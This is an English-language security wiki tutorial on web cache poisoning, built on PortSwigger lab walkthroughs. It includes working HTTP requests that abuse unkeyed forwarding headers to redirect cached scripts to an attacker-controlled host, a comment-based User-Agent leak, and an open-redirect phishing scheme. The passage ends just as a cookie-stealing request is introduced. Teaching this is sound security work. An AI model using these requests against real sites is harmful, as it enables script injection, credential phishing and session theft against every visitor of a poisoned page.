---
title: "Cache Poisoning"
slug: "cache-poisoning"
chapter: "attacks"
priority: 2
editor: "markdown"
revisionCount: 6
id: 42
createdAt: "2020-05-22T14:17:01Z"
createdBy: "mxrch"
updatedAt: "2022-09-20T13:00:39Z"
updatedBy: "mxrch"
ownedBy: "mxrch"
views: 20
---
<h2 id="bkmrk-qu%27est-ce-que-c%27est-">What is it ?</h2>
<p id="bkmrk-cache-poisoning-was-">Cache poisoning was popularized in 2018, although this attack existed long before, as this 2009 <span style="text-decoration: underline;"><a href="https://owasp.org/www-community/attacks/Cache_Poisoning" target="_blank" rel="noopener"><span style="color: #00ccff; text-decoration: underline;">OWASP article</span></a></span> shows.<br>In short, it consists in poisoning the cache that will be served to the next users.<br>This attack can be anecdotal as very powerful, since it couples with other vulnerabilities, such as <strong>XSS</strong> or <strong>Open Redirection</strong>.<br>For example, we can poison a cache with an <strong>XSS</strong>, which will steal the session cookies of all users who will go to a certain page.</p>
<p id="bkmrk-attention%2C-cela-n%E2%80%99es" class="callout info"><span style="font-weight: 400;"><strong>Beware</strong>, this is not to be confused with <strong>Web Cache Deception (WCD)</strong>, which has neither the same methodology nor the same goal.</span></p>
<p id="bkmrk-in-order-to-understa">In order to understand how it works, we need to understand what this attack is based on: the cache.</p>
<p id="bkmrk-the-purpose-of-the-c">The purpose of the cache is to reduce the response time of the web server. It acts as an intermediary between the web server and the client. It allows to save web pages that have been previously requested and then provide them to other clients requesting the same page.<br>There are two important notions that characterize a cache server:</p>
<ul id="bkmrk-the-amount-of-time-a"><li>The amount of time a page is cached</li>
<li>Whether the cached copy will be delivered or whether the request will be transferred to the web server</li>
</ul><p id="bkmrk-here-is-how-the-cach">Here is how the caching and then the distribution of the cache is done :</p>
<p id="bkmrk-"><img src="/uploads/images/gallery/2020-05/hWAlc4rRPvajeu9F-cache_en.png" alt="cache.png" width="1983" height="1242"></p>
<p id="bkmrk-le-header-x-cache%3A-h">The <strong>X-Cache: Hit</strong> header indicates that we have contacted the cache, and the <strong>X-Cache: Miss</strong> directly with the web server.<br>It is in this second case that the cache will be generated, since it will cache<strong> the response returned by the web server</strong>.<br>So, what happens if we manage to inject arbitrary code into the web server's response during an <strong>X-Cache: Miss </strong>?</p>
<p id="bkmrk-%5Bilustration%5D"><span style="font-weight: 400;"><a href="/uploads/images/gallery/2020-05/dFQ4WXOJU4ni9OYE-poison_en.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/dFQ4WXOJU4ni9OYE-poison_en.png" alt="poison_en.png"></a> <br></span><span style="font-weight: 400;">If we take advantage of <strong>X-Cache: Miss</strong> to inject our arbitrary code, it will be returned and cached, then distributed to all other visitors, without any interaction required from them!<br>Of course, this cache won't stay forever: it is often defined by the <strong>Cache-Control</strong> header.<br>For example: <strong>Cache-Control: max-age=180</strong> means that the cache will stay 3 minutes, until the next caching.</span></p>
<h3 id="bkmrk-les-cache-keys">Cache keys</h3>
<p id="bkmrk-imagine-two-users-fr">Imagine two users from different countries visiting a certain page, such as the home page of a bank.<br>Given the large number of people visiting the site, in order to serve the visitors faster, the bank decided to set up a cache, this will allow the bank to lighten the requests and not regenerate content for each request as explained before.</p>
<p id="bkmrk-but-then%2C-how-to-det">But then, how to determine which cache to send?<br>We won't send a Polish cache to a French visitor, and that's why <strong>cache keys</strong> are set up.<br>They will simply choose in the request which elements to choose to distribute the cache.<br>In our example, it will simply be a language <strong>cookie</strong> (if there is one), such as <code>lang=fr</code>.<br>It can also be <strong>headers</strong> or <strong>GET request parameters</strong>.</p>
<p id="bkmrk--0"><span style="font-weight: 400;"><a href="/uploads/images/gallery/2020-05/xzNOOSDX352Ya1wO-image1.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/xzNOOSDX352Ya1wO-image1.png" alt="image1.png"></a></span></p>
<h3 id="bkmrk-les-unkeyed-inputs">Unkeyed inputs</h3>
<p id="bkmrk-the-unkeyed-inputs-w">The unkeyed inputs will be our vector of attack during cache poisoning.<br>We consider an unkeyed input, a field that is <strong>not a cache key</strong>, but which is <strong>reflected in the response</strong> or <strong>acts on the response</strong> (like redirecting a page to another one).</p>
<p id="bkmrk-like-cache-keys%2C-the">Like Cache Keys, these can be <strong>headers</strong>, <strong>cookies</strong>, or <strong>GET request parameters</strong>.<br>They can also be chained (i.e. several unkeyed inputs at once), as we'll see in the "Resource hijacking" example.</p>
<p id="bkmrk--1"><a href="/uploads/images/gallery/2020-05/VHj7quo4wH0QmgwO-image-1590065107669.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/VHj7quo4wH0QmgwO-image-1590065107669.png" alt="image-1590065107669.png"></a></p>
<p id="bkmrk-trouver-les-unkeyed-"><span style="font-weight: 400;">Finding unkeyed inputs can be boring, fortunately, to make it easier for us, PortSwigger has concocted a wonderful module : Param Miner.</span></p>
<h4 id="bkmrk-param-miner">Param Miner</h4>
<p id="bkmrk-to-use-it-within-bur">To use it within Burp, it's very simple:</p>
<ul id="bkmrk-install-param-miner-"><li>Install Param Miner and activate it</li>
<li>Right-click on the desired query</li>
<li>Choose whether to search for headers, cookies or GET parameters</li>
<li>Start the scan</li>
<li>You can see the scan live thanks to the Flow module, otherwise go to Extender -&gt; Extensions -&gt; Param Miner -&gt; Output (this can take some time)</li>
</ul><p id="bkmrk-here-is-an-example-o">Here is an example of a Param Miner output:</p>
<pre id="bkmrk-updating-active-thre"><code class="language-Ruby">Updating active thread pool size to 8
Queued 1 attacks
Selected bucket size: 8192 for ac741f481eba7f5d80a83ee7003a00d0.web-security-academy.net
Initiating header bruteforce on ac741f481eba7f5d80a83ee7003a00d0.web-security-academy.net
Resuming header bruteforce at -1 on ac741f481eba7f5d80a83ee7003a00d0.web-security-academy.net
Identified parameter on ac741f481eba7f5d80a83ee7003a00d0.web-security-academy.net:
x-forwarded-host
Resuming header bruteforce at -1 on ac741f481eba7f5d80a83ee7003a00d0.web-security-academy.net
Completed attack on ac741f481eba7f5d80a83ee7003a00d0.web-security-academy.net</code></pre>
<p id="bkmrk-on-voit-donc-dans-ce"><span style="font-weight: 400;">We can see in this example that Param Miner has found the <strong>X-Forwarded-Host</strong> header as an <strong>unkeyed input</strong>.</span></p>
<h3 id="bkmrk-cache-buster">Cache buster</h3>
<p id="bkmrk-le-cache-buster-est-"><span style="font-weight: 400;">The cache buster is a parameter that is added in the request to hide only a specific page. Actually, the requested web page and its parameters are cache keys.<br>This allows us not to poison the cache of all visitors during tests.</span></p>
<p id="bkmrk--2"><span style="font-weight: 400;"><a href="/uploads/images/gallery/2020-05/98lMevdoxid7nKiA-image6.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/98lMevdoxid7nKiA-image6.png" alt="image6.png"></a></span></p>
<h3 id="bkmrk-les-headers">Headers</h3>
<p id="bkmrk-pour-que-vous-suivez"><span style="font-weight: 400;">To ensure that you follow this article as closely as possible, here are the headers that we are going to talk about, accompanied by a short description.</span></p>
<p id="bkmrk-concernant-le-cache-"><span style="font-weight: 400;">About the cache :<br></span></p>
<table id="bkmrk-x-cache-indique-si-l" style="height: 213px; width: 100%; border-collapse: collapse;" border="1"><tbody><tr style="height: 46px;"><td style="width: 28.6419%; height: 46px;"><span style="font-weight: 400;">X-Cache</span></td>
<td style="width: 71.3581%; height: 46px;"><span style="font-weight: 400;">Indicates whether the response comes from the cache server (X-Cache: hit) or from the web server (X-Cache: miss).</span></td>
</tr><tr style="height: 35px;"><td style="width: 28.6419%; height: 35px;">
<p><span style="font-weight: 400;">Age</span></p>
</td>
<td style="width: 71.3581%; height: 35px;">Indicates the age of the cache in seconds.</td>
</tr><tr style="height: 125px;"><td style="width: 28.6419%; height: 103px;"><span style="font-weight: 400;">Cache-Control</span></td>
<td style="width: 71.3581%; height: 103px;">
<p><span style="font-weight: 400;">Indicates caching instructions.<br>For example, its lifetime in seconds (max-age), or where the response can be cached<br>(public -&gt; everywhere, private -&gt; in the browser cache).</span></p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control" target="_blank" rel="noopener"><span style="text-decoration: underline; color: #00ccff;">See more</span></a></p>
</td>
</tr><tr style="height: 29px;"><td style="width: 28.6419%; height: 29px;"><span style="font-weight: 400;">Vary</span></td>
<td style="width: 71.3581%; height: 29px;"><span style="font-weight: 400;">Defines the headers that will serve as cache keys.</span></td>
</tr></tbody></table><p id="bkmrk-autres-%3A">Others :</p>
<table id="bkmrk-x-forwarded-host-per" style="height: 127px; width: 100%; border-collapse: collapse;" border="1"><tbody><tr style="height: 46px;"><td style="width: 28.8888%; height: 46px;"><span style="font-weight: 400;">X-Forwarded-Host</span></td>
<td style="width: 71.1112%; height: 46px;"><span style="font-weight: 400;">Identifies the host initially requested by the client in the Host header of the HTTP request.</span></td>
</tr><tr style="height: 52px;"><td style="width: 28.8888%; height: 52px;"><span style="font-weight: 400;">X-Forwarded-Scheme</span></td>
<td style="width: 71.1112%; height: 52px;"><span style="font-weight: 400;">Similar to </span><span style="text-decoration: underline;"><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Proto" target="_blank" rel="noopener"><span style="font-weight: 400; color: #00ccff; text-decoration: underline;">X-Forwarded-Proto</span></a></span><span style="font-weight: 400;">, it is used to identify the protocol (HTTP / HTTPS) used to connect to the proxy.<br></span></td>
</tr><tr style="height: 29px;"><td style="width: 28.8888%; height: 29px;"><span style="font-weight: 400;">X-Original-Url</span></td>
<td style="width: 71.1112%; height: 29px;"><span style="font-weight: 400;">Indicates the URL initially requested.</span></td>
</tr></tbody></table><h2 id="bkmrk-exemples">Examples</h2>
<p id="bkmrk-nous-allons-maintena"><span style="font-weight: 400;">We will now move on to practice, using PortSwigger's excellent Cache Poisoning <a href="https://portswigger.net/web-security/all-labs" target="_blank" rel="noopener"><span style="text-decoration: underline;"><span style="color: #00ccff; text-decoration: underline;">labs</span></span></a></span> <span style="font-weight: 400;">(there are 6 in total, but we will only skim them to practice the most important aspects of Cache Poisoning).</span><em><span style="font-weight: 400;"><br>For the sake of readability, we have replaced all Exploit Servers URLs with <strong>hideandsec.sh</strong>.</span></em></p>
<h3 id="bkmrk-unkeyed-input-basiqu">Basic unkeyed input</h3>
<p id="bkmrk-in-this-example-we-w">In this example we will see how we can poison a site's cache by injecting our own Javascript code.</p>
<p id="bkmrk-by-using-the-burp-pr">By using the Burp proxy on the home page, we can see the beginning of this answer :</p>
<pre id="bkmrk-http%2F1.1-200-ok-cont"><code class="language-HTML">HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Cache-Control: max-age=30
Age: 2
X-Cache: hit
X-XSS-Protection: 0
Content-Length: 10627


&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;link href="/resources/css/labsEcommerce.css" rel="stylesheet"&gt;
        &lt;script type="text/javascript" src="//acb71fdd1e124550803245dc009d00fe.web-security-academy.net/resources/js/tracking.js"&gt;&lt;/script&gt;
        &lt;title&gt;Web cache poisoning with an unkeyed header&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
[...]
</code></pre>
<p id="bkmrk-gr%C3%A2ce-%C3%A0-param-miner%2C"><span style="font-weight: 400;">Thanks to Param Miner, we can find an unkeyed input: <strong>X-Forwarded-Host</strong>.<br>Effectively, by giving it a value we notice that the url of the <span style="color: #00ccff;">tracking.js</span> script changes :</span></p>
<pre id="bkmrk-get-%2F%3Fx%3Dbuster-http%2F"><code class="language-HTML">GET /?x=buster HTTP/1.1
Host: acb71fdd1e124550803245dc009d00fe.web-security-academy.net
X-Forwarded-Host: hideandsec.sh

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Cache-Control: max-age=30
Age: 2
X-Cache: hit
X-XSS-Protection: 0
Content-Length: 10583


&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;link href="/resources/css/labsEcommerce.css" rel="stylesheet"&gt;
        &lt;script type="text/javascript" src="//hideandsec.sh/resources/js/tracking.js"&gt;&lt;/script&gt;
        &lt;title&gt;Web cache poisoning with an unkeyed header&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
[...]
</code></pre>
<p id="bkmrk-bingo-%21-nous-pouvons"><span style="font-weight: 400;">Bingo ! We can poison the cache for 30 seconds for everyone who comes to see this same page !<br>Attention, in order to poison the cache, you have to send the request in order to receive an <strong>X-Cache: miss</strong>, which means that we have sent the request directly to the web server (and not to the cache server), then <strong>X-Cache: hit</strong>, to check that we have poisoned the cache.<br>It's mostly a confirmation, to make sure we don't only have <strong>X-Cache: miss</strong>.</span></p>
<ul id="bkmrk-now-we-have-two-poss"><li id="bkmrk-maintenant-nous-avon"><span style="font-weight: 400;">Now we have two possibilities :<br>Put the url of a web server we own into the<strong> X-Forwarded-Host</strong> with a <span style="color: #00ccff;">/resources/js/tracking.js</span> file in which we can put our own Javascript payload to be loaded by the victims</span></li>
<li><span style="font-weight: 400;">Or inject the Javascript payload directly into the <strong>X-Forwarded-Host</strong> header, but this only works if the server does not filter certain characters.</span></li>
</ul><p id="bkmrk-utilisons-la-premi%C3%A8r"><span style="font-weight: 400;">Let's use the first method.</span><span style="font-weight: 400;"><br></span><span style="font-weight: 400;">Let's put our payload <code>alert(‘oupsi’)</code> in </span><span style="color: #00ccff;">https://hideandsec.sh/resources/js/tracking.js</span><span style="font-weight: 400;">, re-poison the cache and reload the page :<br></span></p>
<p id="bkmrk--3"><span style="font-weight: 400;"><a href="/uploads/images/gallery/2020-05/X7v8jGh7ARtIPedn-image5.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/X7v8jGh7ARtIPedn-image5.png" alt="image5.png"></a></span></p>
<p id="bkmrk-et-voil%C3%A0%2C-c%E2%80%99est-auss"><span style="font-weight: 400;">And it's as simple as that, everyone who accesses the site's home page within 30 seconds will get this message.<br>Of course it's possible to inject any Javascript code and thus steal cookies or make a CSRF etc... After that it's like a simple stored XSS.</span></p>
<h3 id="bkmrk-hijacking-de-ressour">Resource Hijacking</h3>
<p id="bkmrk-imaginons-aller-sur-"><span style="font-weight: 400;">Let's imagine going to a web site and receiving this initial response :</span></p>
<pre id="bkmrk-http%2F1.1-200-ok-cont-0"><code class="language-HTML">HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Keep-Alive: timeout=0
Cache-Control: max-age=30
Age: 24
X-Cache: hit
X-XSS-Protection: 0
Connection: close
Content-Length: 10576


&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;link href="/resources/css/labsEcommerce.css" rel="stylesheet"&gt;
        &lt;script type="text/javascript" src="/resources/js/tracking.js"&gt;&lt;/script&gt;
        &lt;title&gt;Web cache poisoning with multiple headers&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div theme="ecommerce"&gt;
[...]
</code></pre>
<p id="bkmrk-on-peut-voir-%3A"><span style="font-weight: 400;">We can see :</span></p>
<ul id="bkmrk-qu%E2%80%99il-y-a-un-cache%2C-"><li style="font-weight: 400;"><span style="font-weight: 400;">That there is a cache, thanks to the <strong>Cache-Control</strong>, <strong>Age</strong> and <strong>X-Cache</strong> headers</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">That he's making us load a “<span style="color: #00ccff;">tracking.js</span>” script.</span></li>
</ul><p id="bkmrk-lan%C3%A7ons-maintenant-l"><span style="font-weight: 400;">Let's now launch Burp Suite's Param Miner extension for bruteforce unkeyed inputs in headers :</span></p>
<pre id="bkmrk-updating-active-thre-0"><code class="language-Ruby">Updating active thread pool size to 8
Queued 1 attacks
Selected bucket size: 8192 for ace61ff21ef38bb68028159d009a000c.web-security-academy.net
Initiating header bruteforce on ace61ff21ef38bb68028159d009a000c.web-security-academy.net
Resuming header bruteforce at -1 on ace61ff21ef38bb68028159d009a000c.web-security-academy.net
Identified parameter on ace61ff21ef38bb68028159d009a000c.web-security-academy.net:
x-forwarded-scheme
Resuming header bruteforce at -1 on ace61ff21ef38bb68028159d009a000c.web-security-academy.net
Completed attack on ace61ff21ef38bb68028159d009a000c.web-security-academy.net</code></pre>
<p id="bkmrk-param-miner-a-trouv%C3%A9"><span style="font-weight: 400;">Param Miner found the <strong>X-Forwarded-Scheme</strong> header to be an <strong>unkeyed input</strong>.<br>Indeed, when we give it any value other than https, like nothttps or http, it returns a <strong>302</strong> Found (Redirection) :</span></p>
<pre id="bkmrk-get-%2F%3Fx%3Dbuster-http%2F-0"><code class="language-HTML">GET /?x=buster HTTP/1.1
Host: ace61ff21ef38bb68028159d009a000c.web-security-academy.net
X-Forwarded-Scheme: nothttps

HTTP/1.1 302 Found
Location: https://ace61ff21ef38bb68028159d009a000c.web-security-academy.net/?x=buster
Keep-Alive: timeout=0
Cache-Control: max-age=30
Age: 0
X-Cache: miss
X-XSS-Protection: 0
Connection: close
Content-Length: 0</code></pre>
<p id="bkmrk-on-voit-que-le-x-cac"><span style="font-weight: 400;">We can see that the <strong>X-Cache</strong> has the value <strong>Miss</strong>, which means that it has not returned the cache because it has expired (<strong>Age: 0</strong>), that we have managed to communicate with the server and that it has generated the new cache using this response, for a maximum duration of 30 seconds <strong>(max-age=30</strong>).<br>These values concerning the cache can be very useful to develop a small script that will automatically re-poison the cache according to the value of the <strong>Age</strong> header, in our case every 30 seconds.</span></p>
<p id="bkmrk-this-is-a-beginning-"><span style="font-weight: 400;">This is a beginning of </span><span style="text-decoration: underline;"><a href="https://cwe.mitre.org/data/definitions/601.html" target="_blank" rel="noopener"><span style="font-weight: 400; color: #00ccff; text-decoration: underline;">Open Redirection</span></a></span><span style="font-weight: 400;">, </span><span style="font-weight: 400;">but not yet, since it does not redirect to a third host.<br>Luckily we still have the <strong>X-Forwarded-Host</strong> header!</span></p>
<p id="bkmrk-the-x-forwarded-host" style="padding-left: 40px;"><em>The <strong>X-Forwarded-Host </strong>(XFH) header is a de-facto standard header for identifying the original host requested by the client in the <a title="The Host request header specifies the host and port number of the server to which the request is being sent." href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host">Host</a> HTTP request header.</em></p>
<p id="bkmrk-host-names-and-ports" style="padding-left: 40px;"><em>Host names and ports of reverse proxies (load balancers, CDNs) may differ from the origin server handling the request, in that case the X-Forwarded-Host header is useful to determine which Host was originally used.<br></em><em><span style="font-weight: 400;">(From </span></em><span style="text-decoration: underline;"><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host" target="_blank" rel="noopener"><span style="color: #00ccff; text-decoration: underline;"><em><span style="font-weight: 400;">MDN</span></em></span></a></span><em><span style="font-weight: 400;">)</span></em></p>
<p id="bkmrk-il-y-a-donc-des-chan"><span style="font-weight: 400;">Chances are the server will consider our <strong>X-Forwarded-Host</strong> as the host initiating the request, and therefore use it to generate the redirect links :</span></p>
<pre id="bkmrk-get-%2F%3Fx%3Dbuster-http%2F-1"><code class="language-HTML">GET /?x=buster HTTP/1.1
Host: ace61ff21ef38bb68028159d009a000c.web-security-academy.net
X-Forwarded-Scheme: nothttps
X-Forwarded-Host: hideandsec.sh

HTTP/1.1 302 Found
Location: https://hideandsec.sh/?x=buster
Keep-Alive: timeout=0
Cache-Control: max-age=30
Age: 0
X-Cache: miss
X-XSS-Protection: 0
Connection: close
Content-Length: 0</code></pre>
<p id="bkmrk-succ%C3%A8s-%21le-cache-est"><span style="font-weight: 400;">Success!<br>The cache is now poisoned with Open Redirection on our own server.<br>That's nice, but we can't get very far with that, except by doing </span><span style="text-decoration: underline;"><a href="https://www.malwarebytes.com/phishing/" target="_blank" rel="noopener"><span style="font-weight: 400; color: #00ccff; text-decoration: underline;">phishing</span></a></span><span style="font-weight: 400;">.</span></p>
<p id="bkmrk-heureusement-qu%E2%80%99on-a"><span style="font-weight: 400;">Luckily we have another way to inject code: the <span style="color: #00ccff;">tracking.js</span> file we found at the beginning !</span></p>
<pre id="bkmrk-get-%2Fresources%2Fjs%2Ftr"><code class="language-HTML">GET /resources/js/tracking.js?x=buster HTTP/1.1
Host: ace61ff21ef38bb68028159d009a000c.web-security-academy.net

HTTP/1.1 200 OK
Content-Type: application/javascript
Content-Encoding: gzip
Keep-Alive: timeout=0
Cache-Control: max-age=30
Age: 29
X-Cache: hit
X-XSS-Protection: 0
Connection: close
Content-Length: 70

document.write('&lt;img src="/resources/images/tracker.gif?page=post"&gt;');</code></pre>
<p id="bkmrk-voici-ce-que-nous-do"><span style="font-weight: 400;">Here is what the request gives us without modification.<br>Let's retry the operation from before with <strong>X-Forwarded-Host</strong> and <strong>X-Forwarded-Scheme</strong> :</span></p>
<pre id="bkmrk-get-%2Fresources%2Fjs%2Ftr-0"><code class="language-HTML">GET /resources/js/tracking.js?x=buster HTTP/1.1
X-Forwarded-Host: hideandsec.sh
X-Forwarded-Scheme: nothttps
Host: ace61ff21ef38bb68028159d009a000c.web-security-academy.net

HTTP/1.1 302 Found
Location: https://hideandsec.sh/resources/js/tracking.js?x=buster
Keep-Alive: timeout=0
Cache-Control: max-age=30
Age: 0
X-Cache: miss
X-XSS-Protection: 0
Connection: close
Content-Length: 0</code></pre>
<p id="bkmrk-a-pr%C3%A9sent%2C-toutes-le"><span style="font-weight: 400;">Now all pages that will load the resource <span style="color: #00ccff;">/resources/js/tracking.js</span> will load it on our own server.<br>Now let's configure the payload.<br></span><span style="font-weight: 400;">For this demonstration, I will just run an alert <code>alert(“Oupsi doupsi”)</code> on the home page of the site.<br></span></p>
<p id="bkmrk-portswigger-nous-pro"><span style="font-weight: 400;">PortSwigger offer us an Exploit Server to do this, so let's put the payload in the file <span style="color: #00ccff;">/resources/js/tracking.js</span> :</span></p>
<p id="bkmrk--4"><span style="font-weight: 400;"><a href="/uploads/images/gallery/2020-05/mWLwrtkTqojmmVQj-image4.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/mWLwrtkTqojmmVQj-image4.png" alt="image4.png"></a></span></p>
<p id="bkmrk-it-is-important-to-r"><span style="font-weight: 400;">It is important to reproduce the path displayed in the redirection, otherwise the browser will not be able to load our payload.</span></p>
<p id="bkmrk-enlevons-notre-cache"><span style="font-weight: 400;">Let's remove our cache buster <code><strong>?x=buster</strong></code> </span><span style="font-weight: 400;">to poison the cache of all users, send back our infected request until we get an <strong>X-Cache: miss</strong>, and watch the result on the browser !</span></p>
<p id="bkmrk--5"><span style="font-weight: 400;"><a href="/uploads/images/gallery/2020-05/fol70oLcaEoGMwwD-image3.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/fol70oLcaEoGMwwD-image3.png" alt="image3.png"></a></span></p>
<p id="bkmrk-et-voil%C3%A0%2C-chaque-nou"><span style="font-weight: 400;">That's it, every new user who visits this page will execute our Javascript payload, with no further interaction required from them !<br></span></p>
<h4 id="bkmrk-pour-r%C3%A9sumer"><span style="font-weight: 400;">In summary</span></h4>
<p id="bkmrk-on-a-empoisonn%C3%A9-le-%2F"><span style="font-weight: 400;">We poisoned the <span style="color: #00ccff;">/resources/js/tracking.js</span> by causing a <strong>302</strong> redirection to our own server, then we recreated a fake <span style="color: #00ccff;">/resources/js/tracking.js</span> on our server, by placing our Javascript payload there.<br>Therefore, any user going to this page will load our own <span style="color: #00ccff;">tracking.js</span> because of the <strong>302</strong> redirection.</span></p>
<h3 id="bkmrk-cache-poisoning-cibl"><span style="font-weight: 400;">Targeted Cache Poisoning</span></h3>
<p id="bkmrk-imaginons-maintenant"><span style="font-weight: 400;">Now imagine, during a Red Team mission for example, wanting to target a single person.<br>To do so, the server would have to use cookies specific to a user as a cache key (ex: <strong>User-Agent</strong>, <strong>Session ID</strong>), to poison only the caches that will be returned to that user.<br>For example, we can tell if this is the case when the server returns the "<strong>Vary: User-Agent</strong>" header, but it may be the case even if it doesn't.<br></span><em><span style="font-weight: 400;">Never trust headers.<br></span></em></p>
<p id="bkmrk-prenons-le-cas-d%E2%80%99un-"><span style="font-weight: 400;">Let's take the case of a website that allows you to post comments, using HTML (or that you found an <strong>XSS</strong> on it).<br>You can insert a comment like this :</span></p>
<pre id="bkmrk-%3Ch2%3Eahaha-cool-post-"><code class="language-HTML">&lt;h2&gt;Ahaha cool post ! I love it&lt;/h2&gt;
&lt;img src="hideandsec.sh/thxforyouruseragent" /&gt;</code></pre>
<p id="bkmrk-le-navigateur-va-nat"><span style="font-weight: 400;">The browser will naturally try to load the image, so make a request to our server, with its <strong>User-Agents</strong>.</span></p>
<pre id="bkmrk-172.31.30.141-2020-0"><code class="language-CSS">172.31.30.141   2020-05-09 06:36:41 +0000 "GET /thxforyouruseragent HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"</code></pre>
<p id="bkmrk-jusque-l%C3%A0-rien-d%E2%80%99inc"><span style="font-weight: 400;">So far nothing incredible, but now let's use these <strong>User-Agents</strong> for our cache poisoning on the example before.</span></p>
<pre id="bkmrk-get-%2Fresources%2Fjs%2Ftr-1"><code class="language-HTML">GET /resources/js/tracking.js HTTP/1.1
X-Forwarded-Host: hideandsec.sh
X-Forwarded-Scheme: nothttps
Host: ace61ff21ef38bb68028159d009a000c.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36

HTTP/1.1 302 Found
Location: https://hideandsec.sh/resources/js/tracking.js
Keep-Alive: timeout=0
Cache-Control: max-age=30
Age: 0
X-Cache: miss
X-XSS-Protection: 0
Connection: close
Content-Length: 0</code></pre>
<p id="bkmrk-vous-remarquerez-qu%E2%80%99"><span style="font-weight: 400;">You'll notice that we replaced the <strong>User-Agent</strong> with the one we stole.<br>Therefore, if the cache is configured to take in consideration the <strong>User-Agent</strong> as a <strong>cache key</strong>, this redirection will <strong>only</strong> be done on users having this same <strong>User-Agent</strong> (including our target).</span></p>
<h3 id="bkmrk-local-route-poisonin"><span style="font-weight: 400;">Local Route Poisoning</span></h3>
<p id="bkmrk-imaginons-pour-cet-e"><span style="font-weight: 400;">Let's imagine for this example, that after having launched a Param Miner on the headers of a site, we find ourselves with the headers <strong>X-Original-Url</strong> or <strong>X-Rewrite-Url</strong> as</span> <span style="font-weight: 400;"><strong>unkeyed inputs</strong>.</span></p>
<p id="bkmrk-en-plus-du-danger-qu"><span style="font-weight: 400;">In addition to the danger they <span style="text-decoration: underline;"><a href="https://www.acunetix.com/vulnerabilities/web/url-rewrite-vulnerability/" target="_blank" rel="noopener"><span style="color: #00ccff; text-decoration: underline;">represent</span></a></span> (<span style="text-decoration: underline;"><a href="https://cwe.mitre.org/data/definitions/436.html" target="_blank" rel="noopener"><span style="color: #00ccff; text-decoration: underline;">CWE-436</span></a></span>), we can provoke a request that will ask for a page but return another, which will be kept in cache.<br>See this example :<br></span></p>
<pre id="bkmrk-get-%2F-http%2F1.1-host%3A"><code class="language-HTML">GET / HTTP/1.1
Host: acb71fdd1e124550803245dc009d00fe.web-security-academy.net
X-Original-Url: /admin</code></pre>
<p id="bkmrk-le-site-va-nous-reto"><span style="font-weight: 400;">The site will return us the content of the /admin page, without redirection!<br>So if we inject this request in cache (<strong>X-Cache: Miss</strong> -&gt; <strong>X-Cache: Hit</strong>), all users will receive the content of the <span style="color: #00ccff;">/admin</span> page instead of the home page.</span></p>
<p id="bkmrk-pas-tr%C3%A8s-int%C3%A9ressant"><span style="font-weight: 400;">Not very interesting, you might say, given that we can only use pages from the targeted site, not our own.<br>That's why we have to couple this vulnerability to another one.</span></p>
<h4 id="bkmrk-open-redirection"><span style="font-weight: 400;">Open Redirection</span></h4>
<p id="bkmrk-voici-un-exemple-de-"><span style="font-weight: 400;">Here is an example of what you can do with an Open Redirection :</span></p>
<pre id="bkmrk-get-%2Ftransactions.ph"><code class="language-HTML">GET /transactions.php HTTP/1.1
Host: acb71fdd1e124550803245dc009d00fe.web-security-academy.net
X-Original-Url: /logout.php?callback=https://hideandsec.sh/transactions.php</code></pre>
<p id="bkmrk-on-demande-%2Ftransact">We ask for <span style="color: #00ccff;">/transactions.php</span>, except that behind it, the server will return <span style="color: #00ccff;">/logout.php?callback=https://hideandsec.sh/transactions.php</span>.</p>
<p id="bkmrk-donc-il-va-d%E2%80%99abord-a"><span style="font-weight: 400;">So it will first go to <span style="color: #00ccff;">logout.php</span>, and in both cases (if the server has an open session or not), it will <strong>redirect to the callback</strong> (our transactions page), whereas if we had made an open redirection to the callback of <span style="color: #00ccff;">login.php</span> and the server has no open session, it would have loaded the login page instead of the callback.</span></p>
<p id="bkmrk-cela-revient-donc-%C3%A0-"><span style="font-weight: 400;">This is therefore equivalent of a <strong>more elaborate phishing</strong>, since no social engineering is required to get a victim to click on a link redirecting to our fake site, and most importantly, all users will be trapped.<br>We will then be able to retrieve all of our victims' <strong>banking data</strong>, and even their <strong>credentials</strong>, by asking them to confirm their password and/or identity during a transaction.</span></p>
<h4 id="bkmrk-xss"><span style="font-weight: 400;">XSS</span></h4>
<p id="bkmrk-pour-escape-cette-re"><span style="font-weight: 400;">To escape this restriction to redirect only to a page of the site concerned, an XSS can be used.<br>Let's imagine an XSS on the page </span><span style="color: #00ccff;">/search?q=&lt;script&gt;alert(“Your site is very secure”)&lt;/script&gt;</span><span style="font-weight: 400;">.<br></span><span style="font-weight: 400;">Once we can inject javascript, we can do a little bit whatever we want, like injecting a keylogger with BeEF, stealing cookies, redirecting to an external site,...</span></p>
<p id="bkmrk-voici-un-exemple-de--0"><span style="font-weight: 400;">Here's an example of a request that will steal the victims' cookies :</span></p>
